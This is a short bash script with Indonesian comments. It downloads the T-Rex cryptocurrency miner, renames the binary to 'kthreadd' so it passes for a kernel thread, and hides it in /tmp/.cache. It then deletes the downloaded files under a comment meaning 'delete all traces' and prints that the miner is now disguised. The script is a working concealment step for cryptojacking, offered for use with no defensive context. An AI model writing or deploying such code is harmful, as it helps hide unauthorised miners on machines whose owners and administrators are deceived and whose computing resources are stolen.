#!/bin/bash

# Link download
URL="https://github.com/trexminer/T-Rex/releases/download/0.26.8/t-rex-0.26.8-linux.tar.gz"
ARCHIVE="t-rex-0.26.8-linux.tar.gz"
FOLDER="t-rex-0.26.8-linux.tar"
MINER_NAME="t-rex"
NEW_NAME="kthreadd"
DEST="/tmp/.cache"

# Download file
wget -q --show-progress "$URL"

# Extract file .tar.gz
tar -xf "$ARCHIVE"

# Pastikan folder hasil ekstrak ada
if [[ -d "$FOLDER" ]]; then
    # Rename dan pindah
    mv "$FOLDER/$MINER_NAME" "$NEW_NAME"
    mkdir -p "$DEST"
    mv "$NEW_NAME" "$DEST/"
    
    # Hapus semua jejak
    rm -rf "$FOLDER" "$ARCHIVE"
    
    echo "Done sayang! udah nyamar jadi $DEST/$NEW_NAME"
else
    echo "Folder hasil ekstrak nggak ketemu, mungkin ada yang salah ekstrak sayang~"
fi
